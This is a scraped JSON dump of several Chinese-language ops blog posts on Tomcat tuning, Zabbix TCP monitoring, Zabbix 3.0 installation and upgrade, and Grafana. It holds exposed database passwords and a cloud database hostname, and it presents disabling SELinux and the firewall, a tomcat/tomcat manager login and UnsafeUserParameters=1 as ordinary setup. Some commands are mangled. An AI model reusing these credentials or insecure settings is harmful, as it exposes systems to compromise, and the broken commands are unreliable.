minProcessors：最小空闲连接线程数，用于提高系统处理性能，默认值为10maxProcessors：最大连接线程数，即：并发处理的最大请求数，默认值为75acceptCount：允许的最大连接数，应大于等于maxProcessors，默认值为100enableLookups：是否反查域名，取值为：true或false。为了提高处理能力，应设置为falseconnectionTimeout：网络连接超时，单位：毫秒。设置为0表示永不超时，这样设置有隐患的。通常可设置为30000毫秒。 参数说明12345678910111213141516171819202122232425262728默认的tomcat 参数： &lt;Connector port=“8080\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt;修改： &lt;Connector port=“8080\" protocol=\"HTTP/1.1\" maxThreads=\"600\" minSpareThreads=\"100\" maxSpareThreads=\"500\" acceptCount=\"700\" connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt;``` 这样设置以后，基本上没有再当机过。``` bash maxThreads=“600\" 表示最多同时处理600个连接 ///最大线程数 minSpareThreads=“100\" 表示即使没有人使用也开这么多空线程等待 ///初始化时创建的线程数 maxSpareThreads=“500\" 表示如果最多可以空500个线程，例如某时刻有505人访问，之后没有人访问了，则tomcat不会保留505个空线程，而是关闭505个空的。 ///一旦创建的线程超过这个值，Tomcat就会关闭不再需要的socket线程。 acceptCount=\"700\"//指定当所有可以使用的处理请求的线程数都被使用时，可以放到处理队列中的请求数，超过这个数的请求将不予处理这里是http connector的优化，如果使用apache和tomcat做集群的负载均衡，并且使用ajp协议做apache和tomcat的协议转发，那么还需要优化ajp connector。 &lt;Connector port=\"8009\" protocol=\"AJP/1.3\" maxThreads=\"600\" minSpareThreads=\"100\" maxSpareThreads=\"500\" acceptCount=\"700\"connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt; 报错errorTomcat的JVM提示内存溢出1查看%TOMCAT_HOME%\\logs文件夹下，日志文件是否有内存溢出错误 修改Tomcat的JVM11、错误提示：java.lang.OutOfMemoryError: Java heap space Tomcat默认可以使用的内存为128MB，在较大型的应用项目中，这点内存是不够的，有可能导致系统无法运行。常见的问题是报Tomcat内存溢出错误，Out of Memory(系统内存不足)的异常，从而导致客户端显示500错误，一般调整Tomcat的使用内存即可解决此问题。 12windows环境下修改 “%TOMCAT_HOME%\\bin\\catalina.bat”文件，在文件开头增加如下设置：JAVA_OPTS=-Xms2048m -Xmx2048m Linux环境下修改12 “%TOMCAT_HOME%\\bin\\catalina.sh”文件，在文件开头增加如下设置：JAVA_OPTS=-Xms2048m -Xmx2048m其中，-Xms设置初始化内存大小，-Xmx设置可以使用的最大内存。 跟我上面那么设置就可以了。 2.错误提示：java.lang.OutOfMemoryError: PermGen space 原因： 12 PermGen space的全称是Permanent Generation space,是指内存的永久保存区域，这块内存主要是被JVM存放Class和Meta信息的,Class在被Loader时就会被放到PermGen space中，它和存放类实例(Instance)的Heap区域不同,GC(Garbage Collection)不会在主程序运行期对PermGen space进行清理，所以如果你的应用中有很CLASS的话,就很可能出现PermGen space错误，这种错误常见在web服务器对JSP进行pre compile的时候。如果你的WEB APP下都用了大量的第三方jar, 其大小超过了jvm默认的大小(4M)那么就会产生此错误信息了。 解决方法： 123456在catalina.bat的第一行增加： set JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m - XX:MaxPermSize=256m在catalina.sh的第一行增加： JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m XX:MaxPermSize=256m 查看Tomcat的JVM内存12345678910111. Tomcat6中没有设置任何默认用户，因而需要手动往Tomcat6的conf文件夹下的tomcat-users.xml文件中添加用户。如： &lt;role rolename=\"manager\"/&gt; &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"manager\"/&gt; 注：添加完需要重启Tomcat6。2. 访问http://localhost:8080/manager/status，输入上面添加的用户名和密码。3. 然后在如下面的JVM下可以看到内存的使用情况。 学习Tomcat给自己总结。","raw":null,"content":null,"categories":[{"name":"tomcat","slug":"tomcat","permalink":"http://blog.yangcvo.me/categories/tomcat/"}],"tags":[{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","permalink":"http://blog.yangcvo.me/tags/Java-Tomcat-notes/"}]},{"title":"zabbix监控tcp连接数","slug":"性能监控/Zabbix/zabbix监控tcp连接数","date":"2016-06-21T08:37:36.000Z","updated":"2017-03-30T08:29:26.000Z","comments":true,"path":"2016/06/21/性能监控/Zabbix/zabbix监控tcp连接数/","link":"","permalink":"http://blog.yangcvo.me/2016/06/21/性能监控/Zabbix/zabbix监控tcp连接数/","excerpt":"","text":"系统环境: CentOS release 6.7 (Final) zabbix.3.0.3 zabbix-server端：首先创建脚本 Shell 12mkdir /usr/local/zabbix/scripts[root@zabbix scripts]# vim /usr/local/zabbix/scripts/tcp_connections.sh script： 1234567891011121314151617181920212223242526272829303132#!/bin/bash stat() &#123; netstat -an | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;' &#125; case $1 in TIME_WAIT) stat |grep 'TIME_WAIT' |awk '&#123;print $2&#125;' ;; CLOSE_WAIT) stat | grep 'CLOSE_WAIT' |awk '&#123;print $2&#125;' ;; FIN_WAIT1) stat | grep 'FIN_WAIT1' |awk '&#123;print $2&#125;' ;; ESTABLISHED) stat | grep 'ESTABLISHED' |awk '&#123;print $2&#125;' ;; SYN_RECV) stat |grep 'SYN_RECV' |awk '&#123;print $2&#125;' ;; LAST_ACK) stat |grep 'LAST_ACK' |awk '&#123;print $2&#125;' ;; LISTEN) stat |grep 'LISTEN' |awk '&#123;print $2&#125;' ;; *) echo \"Usage: TIME_WAIT CLOSE_WAIT FIN_WAIT1 ESTABLISHED SYN_RECV LAST_ACK LISTEN\" ;;esac 测试脚本是否可用 123[root@zabbix scripts]# chmod +x tcp_connections.sh[root@zabbix scripts]# ./tcp_connections.sh ESTABLISHED59 zabbix-agent端：1[root@zabbix scripts]# vim /usr/local/zabbix/etc/zabbix_agentd.conf.d/monitor_tcp_connections.conf 编辑server端zabbix_agentd配置 1234567UserParameter=tcp.time_wait,/usr/local/zabbix/scripts/tcp_connections.sh TIME_WAITUserParameter=tcp.close_wait,/usr/local/zabbix/scripts/tcp_connections.sh CLOSE_WAITUserParameter=tcp.fin_wait1,/usr/local/zabbix/scripts/tcp_connections.sh FIN_WAIT1UserParameter=tcp.established,/usr/local/zabbix/scripts/tcp_connections.sh ESTABLISHEDUserParameter=tcp.syn_recv,/usr/local/zabbix/scripts/tcp_connections.sh SYN_RECVUserParameter=tcp.last_ack,/usr/local/zabbix/scripts/tcp_connections.sh LAST_ACKUserParameter=tcp.listen,/usr/local/zabbix/scripts/tcp_connections.sh LISTEN 重启服务123[root@zabbix scripts]# /etc/init.d/zabbix_agentd restartShutting down zabbix_agentd: [确定]Starting zabbix_agentd: [确定] 测试监控是否有数据12/usr/local/zabbix/bin/zabbix_get -s localhost -k tcp.establishedZBX_NOTSUPPORTED: Unsupported item key. 出现这个错误，提示我key值有问题。所以我检查了下配置。 添加了一条目录。 12vim /usr/local/zabbix/etc/zabbix_agentd.confInclude=/usr/local/zabbix/etc/zabbix_agentd.conf.d/*.conf 然后测试： 12[root@zabbix scripts]# /usr/local/zabbix/bin/zabbix_get -s localhost -k tcp.established64 然后在web里创建模版，方便以后多台添加 选择配置-模板-右上角.创建模板 填写模版名称 创建监控项 可以克隆创建监控项。 创建图形 模版创建完成后，要关联到监控主机 点击主机，选择模版 等一会儿数据图形就会出现 其他机器也是一样直接添加模板即可。在agentd下面添加key键值重启服务就行。 可参考： zabbix监控tcp连接数 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix-server3.0.3版本环境安装部署","slug":"性能监控/Zabbix/zabbix-server3-0-3版本环境安装部署","date":"2016-06-19T09:05:56.000Z","updated":"2017-03-14T06:01:39.000Z","comments":true,"path":"2016/06/19/性能监控/Zabbix/zabbix-server3-0-3版本环境安装部署/","link":"","permalink":"http://blog.yangcvo.me/2016/06/19/性能监控/Zabbix/zabbix-server3-0-3版本环境安装部署/","excerpt":"","text":"系统环境： 192.168.1.170 MySQL主 192.168.1.183 zabbix-server CentOS Linux release 7.2.1511 (Core) zabbix源码下载 : http://www.zabbix.com/download.php 依赖下载： https://github.com/zabbixcn/curl-rpm/tree/master/RPMS zabbix Down下载安装包：http://repo.zabbix.com/zabbix/3.2/rhel/6/x86_64/ zabbix3.2 http://jaist.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.2.4/zabbix-3.2.4.tar.gz 第一步zabbix：关闭本机上的selinux与iptables服务 1、关闭SELinux 123456#下面的命令实现永久关闭SELinux sed -i 's/^SELINUX=.*/#&amp;/;s/^SELINUXTYPE=.*/#&amp;/;/SELINUX=.*/a SELINUX=disabled' /etc/sysconfig/selinux#下面的命令实现临时关闭SELinux/usr/sbin/setenforce 0/usr/sbin/setenforce: SELinux is disabled 也可以设置开放端口出去。 CentOS 7.0默认使用的是firewall作为防火墙，这里改为iptables防火墙。 firewall： 123systemctl start firewalld.service#启动firewallsystemctl stop firewalld.service#停止firewallsystemctl disable firewalld.service#禁止firewall开机启动 CentOS7默认的防火墙不是iptables,而是firewalle.centos 7 的默认没有安装iptables 需要安装： 123yum install iptables-services#保存上述规则 service iptables save 等会再添加端口：10050 ，10051 搭建LAMP环境，或LNMP环境 1yum install mysql-server httpd php –y 安装其它依赖包 1yum install mysql-devel gcc net-snmp-devel curl-devel perl-DBI php-gd php-mysql php-bcmath php-mbstring php-xml –y gcc OpenIPMI-devel net-snmp-devel.x86_64 libxml2-devel mysql-devel 这里MySQL我已经在MySQL服务器上面安装好了。只需要创建个新的zabbix数据库即可。 增加zabbix用户和组 12groupadd zabbixuseradd –g zabbix –m zabbix 下载zabbix3.0版本，解压安装 123456789101112131415wget http://oak0aohum.bkt.clouddn.com/zabbix-3.0.3.tar.gz -c /tmp/cd /tmp/tar zxf zabbix-3.0.3.tar.gz./configure --prefix=/usr/local/zabbix --enable-server --with-mysql --with-net-snmp --with-libxml2 --with-libcurl --with-openipmi --enable-proxy --enable-agent --enable-java --with-ldap编译成功这里会出现：************************************************************ Now run 'make install' ** ** Thank you for using Zabbix! ** &lt;http://www.zabbix.com&gt; ************************************************************#直接make install 安装即可： make install 这里编译安装 我加上了：–enable-java 这样防止后期监控tomcat需要重新编译。 3.配置数据库 登陆到192.168.1.170服务器上面： 12# mysql -e \"create database zabbix character set utf8 collate utf8_bin;\" #修改时区# mysql -e \"grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\" #创建数据库名 这里我设置了只能192.168.1.0网段可以访问数据库。 所以这里创建数据库直接这么操作了。 1234567891011121314151617181920[root@mysql ~]# mysql -uroot -pIhaozhuo_b313 -h 192.168.1.170Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 10Server version: 5.6.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.06 sec)mysql&gt; GRANT ALL ON zabbix.* TO 'zabbix'@'192.168.1.%' IDENTIFIED BY 'zabbix123.com';Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 四.导入数据库文件：1cd /usr/share/doc/zabbix-server-mysql-2.4.8/create 操作三条命令把数据导入到在指定的MySQL：zabbix 123mysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; schema.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; images.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; data.sql 五、配置文件及web前端文件修改添加服务端口 vi /etc/services #编辑，在最后添加以下代码 123456# Zabbixzabbix-agent 10050/tcp # Zabbix Agentzabbix-agent 10050/udp # Zabbix Agentzabbix-trapper 10051/tcp # Zabbix Trapperzabbix-trapper 10051/udp # Zabbix Trapper:wq! #保存退出 添加后如下 12345# grep zabbix /etc/serviceszabbix-agent 10050/tcp #ZabbixAgentzabbix-agent 10050/udp #ZabbixAgentzabbix-trapper 10051/tcp #ZabbixTrapperzabbix-trapper 10051/udp #ZabbixTrapper 修改zabbix配置文件 vim /usr/local/zabbix/etc/zabbix_server.conf 12345DBName=zabbix #数据库名称DBUser=zabbix #数据库用户名DBPassword=zabbix123.com #数据库密码ListenIP=192.168.1.170 #数据库ip地址AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts #zabbix运行脚本存放目录 :wq! #保存退出 1234vi /usr/local/zabbix/etc/zabbix_agentd.confInclude=/usr/local/zabbix/etc/zabbix_agentd.conf.d/UnsafeUserParameters=1 #启用自定义key:wq! #保存退出 1.2 COPY相关脚本到新编译的目录下 123456789101112131415161718 cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_server /etc/rc.d/init.d/zabbix_server[root@salt etc]# cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_agentd /etc/rc.d/init.d/zabbix_agentd修改脚本路径：vim /etc/init.d/zabbix_server BASEDIR=/usr/local/zabbix/vim /etc/init.d/zabbix_agentdBASEDIR=/usr/local/zabbix chmod +x /etc/rc.d/init.d/zabbix_server #添加脚本执行权限chmod +x /etc/rc.d/init.d/zabbix_agentd #添加脚本执行权限chkconfig zabbix_server on #添加开机启动chkconfig zabbix_agentd on #添加开机启动 八、配置web站点 1234cd zabbix-2.4.8cp -r /zabbix-2.4.8/frontends/php /var/www/html/zabbixcd /var/www/html/chown -R zabbix:zabbix zabbix service zabbix_server start #启动zabbix服务端 service zabbix_agentd start #启动zabbix客户端 然后重启服务。 发现出现500 网页无法显示，我去网上Google了下，说我的PHP文件版本过低。 我查看了下我的版本： 1234567php -versionPHP 5.3.3 (cli) (built: Feb 9 2016 10:36:17)Copyright (c) 1997-2010 The PHP GroupZend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologieswhereis phpphp: /usr/bin/php /etc/php.d /etc/php.ini /usr/lib64/php /usr/share/php /usr/share/man/man1/php.1.gz 查询了下这是默认安装的，yum安装的。 mv /usr/share/php/ /usr/share/php.5.3.3备份之前的方便回滚，然后升级PHP： 快速将PHP 5.3升级至PHP 5.5CentOS 6.7以下为 CentOS 下安装 PHP 方法： 添加 epel 源 1# rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm 添加 remi 源 1# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm 安装 PHP 1# yum --enablerepo=remi,remi-php55 install php-fpm php-common php-devel php-mysqlnd php-mbstring php-mcrypt 查看 PHP 版本 1234# php -vPHP 5.5.9 (cli) (built: Feb 11 2014 08:25:33)Copyright (c) 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies 启动 php-fpm 12# service php-fpm startStarting php-fpm: [ OK ] 这里重启完以后，记得要让php生效，不然的话不行。 我一开始刷新还是出现了500错误，后来用php指针测试了下版本是多少？ www站点添加。info.php 12345&lt;?php phpinfo();?&gt;; 访问地址/info.php 出现版本是5.3 环境问题，重启http就可以了。 这里已经搞定咯。 如果出现图形乱码：可以参考下面的文档。 其实把之前的字体拷贝过去，然后先修改下配置文件即可。 1cp /var/www/html/zabbix.2.4.7/fonts/simkai.ttf /var/www/html/zabbix/fonts/. zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix-server2.4全新升级3.0版本","slug":"性能监控/Zabbix/zabbix-server2-4全新升级3-0版本","date":"2016-06-18T04:22:44.000Z","updated":"2017-03-16T03:14:23.000Z","comments":true,"path":"2016/06/18/性能监控/Zabbix/zabbix-server2-4全新升级3-0版本/","link":"","permalink":"http://blog.yangcvo.me/2016/06/18/性能监控/Zabbix/zabbix-server2-4全新升级3-0版本/","excerpt":"","text":"zabbix3.0出来了一段时间了，最近忍不住把公司原来的2.4.7版本升级到了3.0。zabbix升级其实很简单，基本步骤为：备份-&gt;重新安装新版本。接下来简单写下这次升级的操作和问题 1、 关闭zabbix server防止有新的数据提交到数据库中、直接关闭数据库效果也是一样的。这里我先关闭掉我的服务： 12/etc/init.d/zabbix_server stop 关闭了server服务端/etc/init.d/zabbix_agentd stop 关闭了agent客户端 2、 备份2.1 备份数据库最简单的备份：关闭数据，整个数据库目录copy一份。虽说升级一般不会出现什么问题，但是安全起见还是有必要备份一下，就算升级成功，但是不能保证新版本让你喜欢，这个时候回退也有后路。 这里我用的是命令导出的：也可以用NAvicat，导出结构和数据。 1mysqldump -u root -p***** -h MySQLIP地址 --opt --skip-lock-tables --flush-logs --database zabbix &gt; /tmp/zabbix.sql 2.2 备份文件备份配置文件（通常是/etc/zabbix）、php网站源码、zabbix二进制文件（整个程序目录备份就OK） 123456789备份配置文件： mv /usr/local/zabbix/ /usr/local/zabbix.2.4.7备份启动脚本： mv /etc/init.d/zabbix_server /etc/init.d/zabbix_server.2.4.7 mv /etc/init.d/zabbix_agentd /etc/init.d/zabbix_agentd.2.4.7备份zabbix.php文件： mv /var/www/html/zabbix/ /var/www/html/zabbix.2.4.7 3、安装配置3.1 安装Zabbix server 重新安装新版本重头安装一次zabbix，也就是configure –… make make install.备注：一般高版本zabbix server兼容低版本zabbix客户端。如果发现有异常，那么你的zabbix客户端也相应升级一下。客户端升级比较简单：更新二进制文件，配置文件对照下是否有修改即可。 下载zabbix3.0版本，解压安装 123456789101112131415161718wget http://oak0aohum.bkt.clouddn.com/zabbix-3.0.3.tar.gz -c /tmp/cd /tmp/tar zxf zabbix-3.0.3.tar.gz./configure --prefix=/usr/local/zabbix --enable-server --with-mysql --with-net-snmp --with-libxml2 --with-libcurl --with-openipmi --enable-proxy --enable-agent --enable-java --with-ldap如果编译失败没有libxml2 ldap 需要yum安装下：yum install openldap openldap-devel libxml2* -y 编译成功这里会出现：************************************************************ Now run 'make install' ** ** Thank you for using Zabbix! ** &lt;http://www.zabbix.com&gt; ************************************************************#直接make install 安装即可： make install 这里编译安装 我加上了：–enable-java 这样防止后期监控tomcat需要重新编译。安装好以后： 3.2 检查配置文件zabbix_server.conf配置参数可能会有变化，修改变更后的参数，或者直接修改新的配置文件。 1.1 对照老版本的zabbix_server.conf进行修改，不能直接替换。 123456789101112131415vim /usr/local/zabbix/etc/LogFile=/tmp/zabbix_server.logDBHost=rdsm5t6w65741u8q1y53.mysql.rds.aliyuncs.comDBName=zabbixDBUser=zabbixDBPassword=zabbix2015StartPollers=12JavaGateway=127.0.0.1JavaGatewayPort=10052StartJavaPollers=5Timeout=4FpingLocation=/usr/local/fping/sbin/fpingLogSlowQueries=3000AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts 1.2 COPY相关脚本到新编译的目录下 1234567891011 cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_server /etc/rc.d/init.d/zabbix_server[root@salt etc]# cp /tmp/zabbix-3.0.3/misc/init.d/fedora/core/zabbix_agentd /etc/rc.d/init.d/zabbix_agentdvim /etc/init.d/zabbix_server BASEDIR=/usr/local/zabbix/vim /etc/init.d/zabbix_agentdBASEDIR=/usr/local/zabbix 1.3 alertscripts和externalscripts 里面的相关脚本复制到新的安装目录下。 12cp /usr/local/zabbix.2.4.7/share/zabbix/alertscripts/* /usr/local/zabbix/share/zabbix/alertscripts/.chown -R zabbix:zabbix /usr/local/zabbix/share/zabbix/alertscripts/* 4、 部署zabbix PHP源码 4.1 将新的前端PHP代码也COPY到对应的目录下。 123456cd /tmp/cp -r /zabbix-3.0.3/frontends/php /var/www/html/zabbixcd /var/www/html/chown -R zabbix:zabbix zabbixcp zabbix.2.4.7/conf/zabbix.conf.php zabbix/conf/zabbix.conf.php 拷贝下php文件这样数据就能访问同步过来了。 然后重启服务。 发现出现500 网页无法显示，我去网上Google了下，说我的PHP文件版本过低。 我查看了下我的版本： 1234567php -versionPHP 5.3.3 (cli) (built: Feb 9 2016 10:36:17)Copyright (c) 1997-2010 The PHP GroupZend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologieswhereis phpphp: /usr/bin/php /etc/php.d /etc/php.ini /usr/lib64/php /usr/share/php /usr/share/man/man1/php.1.gz 查询了下这是默认安装的，yum安装的。 mv /usr/share/php/ /usr/share/php.5.3.3备份之前的方便回滚，然后升级PHP： 快速将PHP 5.3升级至PHP 5.5CentOS 6.7以下为 CentOS 下安装 PHP 方法： 添加 epel 源 1# rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm 添加 remi 源 1# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm 安装 PHP 1# yum --enablerepo=remi,remi-php55 install php-fpm php-common php-devel php-mysqlnd php-mbstring php-mcrypt 查看 PHP 版本 1234# php -vPHP 5.5.9 (cli) (built: Feb 11 2014 08:25:33)Copyright (c) 1997-2014 The PHP GroupZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies 启动 php-fpm 12# service php-fpm startStarting php-fpm: [ OK ] 这里重启完以后，记得要让php生效，不然的话不行。 我一开始刷新还是出现了500错误，后来用php指针测试了下版本是多少？ www站点添加。info.php 12345&lt;?php phpinfo();?&gt;; 访问地址/info.php 出现版本是5.3 环境问题，重启http就可以了。 这里已经搞定咯。 如果出现图形乱码：可以参考下面的文档。 其实把之前的字体拷贝过去，然后先修改下配置文件即可。 1cp /var/www/html/zabbix.2.4.7/fonts/simkai.ttf /var/www/html/zabbix/fonts/. 3.0版本升级以后其实就是个数据库不变，其他的重新安装一遍即可。 10多分钟就可以搞定的。 升级遇到的问题 The frontend does not match Zabbix database. Current database version (mandatory/optional): 2050119/2050119. Required mandatory version: 3000000. Contact your system administrator.登录到数据库执行下面的sql,就可以修复这个问题 1mysql&gt;update dbversion set mandatory=3000000; 2 zabbix 内存溢出跑了新版本1天，老是启动不起来zabbix_server ，看日志出现下列问题 123456789101112131415161718192021222316701:20140925:191733.530 Starting Zabbix Server. Zabbix 3.0.3 (revision 48953).16701:20140925:191733.530 ****** Enabled features ******16701:20140925:191733.530 SNMP monitoring: YES16701:20140925:191733.530 IPMI monitoring: YES16701:20140925:191733.530 WEB monitoring: YES16701:20140925:191733.530 VMware monitoring: NO16701:20140925:191733.530 Jabber notifications: NO16701:20140925:191733.530 Ez Texting notifications: YES16701:20140925:191733.530 ODBC: NO16701:20140925:191733.530 SSH2 support: NO16701:20140925:191733.531 IPv6 support: NO16701:20140925:191733.531 ******************************16701:20140925:191733.531 using configuration file: /opt/zabbix/etc/zabbix_server.conf15996:20140925:191145.759 completed 97% of database upgrade15996:20140925:191147.139 completed 98% of database upgrade15996:20140925:191147.422 completed 99% of database upgrade15996:20140925:191147.428 completed 100% of database upgrade15996:20140925:191147.428 database upgrade fully completed15996:20140925:191148.800 __mem_malloc: skipped 0 asked 48 skip_min 0 skip_max 429496729515996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): out of memory (requested 44 bytes)15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): please increase CacheSize configuration parameter15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): out of memory (requested 44 bytes)15996:20140925:191148.800 [file:dbconfig.c,line:445] zbx_mem_malloc(): please increase CacheSize configuration parameter 解决打开zabbix_server.conf找到 Option: CacheSize把原来的# CacheSize=8M 前面的#注释去掉，将8M修改为1024，这个1024根据服务器性能修改。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix+Grafana安装使用监控结合","slug":"性能监控/Zabbix/zabbix-Grafana安装使用结合","date":"2016-06-17T08:20:12.000Z","updated":"2017-02-09T10:08:44.000Z","comments":true,"path":"2016/06/17/性能监控/Zabbix/zabbix-Grafana安装使用结合/","link":"","permalink":"http://blog.yangcvo.me/2016/06/17/性能监控/Zabbix/zabbix-Grafana安装使用结合/","excerpt":"","text":"前言做运维的很重要的基础工作就是监控去准确定位问题，之前用的是Nagios做过监控，也用过cacti，这个之前在IDC做CDN网络方面用的比较多，监控流量好帮手。 为什么选择zabbix其实现在是算开源监控比较火的。更重要是几款监控做了对比。 cacti、zabbix同nagios一样，都是非常优势的开源监控软件。 Nagios: 轻量级/方便/快捷是nagios最大的优势，特别是它的插件机制，你可以用自己熟悉的语言实现几乎任何自己想要实现的监控。但nagios的图标图形显示的很丑，这方面的确不敢恭维。Cacti: cacti的优势表现在系统方面的监控，特别针对流量的监控功能， 以及cacti图形显示美观等，cacti在这两方面表现的都不错。Zabbix: zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。功能全面，很多公司都是基于zabbix自建的监控平台。但维护相对困难，相比没有nagios轻量及灵活。 现在sass监控，也成为企业监控的选择之一了，加上zabbix、Ganglia等，再加上APM的兴起，监控体系也越来越完善了。从基础网络监控、硬件、服务器、应用、性能，然后端到端等方面，都可以插入，但是没有一个比较完整的监控体系是可以完全胜任的，所以还需要根据自身的应用和目标去综合做选择。 前几天接触到了ELK(logstash, elasticsearch, kibana)这套日志收集展示工具集,的确很方便，这样对以后开发指定权限查看日志，可以很好管理。 这里简单说了下为什么使用zabbix, Ganglia的功能是哪些？下面有讲到。 Grafana是什么？个人认为： Grafana是一款对后端数据进行实时展示，跟elk那种差不多，非常清晰而且灵活丰富的图形化选项，可以混合多种风格，支持白天和夜间的模式，多个数据源，而跟zabbix比起来没有那么专业监控，没有那么丰富的监控功能，就是一个图像展示。 功能亮点 丰富的图形与Grafana 模板变量可以创建可重用的仪表板 官方是怎么解释Grafana的： grafana是用于可视化大型测量数据的开源程序，他提供了强大和优雅的方式去创建、共享、浏览数据。dashboard中显示了你不同metric数据源中的数据。grafana最常用于因特网基础设施和应用分析，但在其他领域也有机会用到，比如：工业传感器、家庭自动化、过程控制等等。grafana有热插拔控制面板和可扩展的数据源，目前已经支持Graphite、InfluxDB、OpenTSDB、Elasticsearch。 Grafana功能亮点1234567891011121314151617181920212223242526272829丰富的图形完全交互的，可编辑的图表。多个Y轴，对数刻度和选项。混合造型画出你的图形，你想怎么。混线，点和酒吧。混合堆叠瓦特/隔离系列。主题附带两个主题。如果你不喜欢默认的黑暗的主题，切换到光的主题。模板变量创建变量会自动填入值从您的数据库。一般可重复使用您可以在度量查询和面板标题中使用变量。重复面板自动重复每个选定的变量值的行或面板。数据源支持Graphite，Elasticsearch，Prometheus，InfluxDB，OpenTSDB和KairosDB开箱。或使用插件功能来添加自己的。认证管理用户，角色和组织。通过LDAP，基本验证与认证代理注释注释与datasouces包括Elasticsearch，石墨和InfluxDB丰富的活动图快照共享创建和共享在1点击一个完全交互式图表和只有你的团队或全世界分享。 Grafana官网Granfana官网：http://grafana.org Granfana官网安装参考文档安装文档：http://docs.grafana.org/installation/ grafana和LDAP集成：LDAP集成：http://docs.grafana.org/installation/ldap/ grafana演示站点grafana演示站点: http://play.grafana.org/ 3.0版本关于Grafana-zabbix插件官方文档：Grafana-zabbix插件安装官方使用文档 安装Grafana 温馨提示： 12grafana的版本和grafana-zabbix的版本必须匹配，否则会出现异常。本文以grafana2.5版本为例讲解，如果后面grafana和grafana-zabbix更新，需要将2个版本匹配即可。 现在最新版本是3.0版本，我们可以试试安装在基于RPM的Linux版本（CentOS，Fedora的，OpenSuse当中，红帽） 安装最新稳定版： 1sudo yum install https://grafanarel.s3.amazonaws.com/builds/grafana-3.1.0-1468321182.x86_64.rpm 如果被墙，可以到我github上面下载：Grafana 这里需要安装下依赖包： 12$ sudo yum install initscripts fontconfig$ sudo rpm -Uvh grafana-3.1.0-1468321182.x86_64.rpm 或者选择YUM方式安装： 